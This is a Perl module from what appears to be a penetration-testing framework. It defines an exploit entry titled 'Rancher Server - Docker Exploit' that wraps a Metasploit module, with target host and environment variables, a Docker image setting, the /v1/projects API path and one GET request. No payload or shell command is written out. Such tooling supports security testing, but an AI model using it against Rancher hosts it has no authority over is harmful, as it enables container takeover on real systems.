package RANCHER::MSF::RancherServer;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "RancherServer";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CONTAINERS  => "?name=",
  DESCRIPTION => undef,
  MSF_MODULE  => "rancher_server",
  PATHS       => ["v1/projects"],
  REFERENCES  => [
                   "https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface",
                 ],
  TITLE       => "Rancher Server - Docker Exploit",
  VARIABLES => {
    'TARGETENV' =>       { DESCRIPTION => "Target Rancher Environment", VALUE => "1a5" },
    'TARGETHOST' =>       { DESCRIPTION => "Target Rancher Host", VALUE => "1h1" },
    'DOCKERIMAGE' =>       {
  DESCRIPTION => "hub.docker.com image to use",
  VALUE => "alpine:latest",
},
    'PATH' =>       { DESCRIPTION => "Rancher API Path", VALUE => "/v1/projects" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/json',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
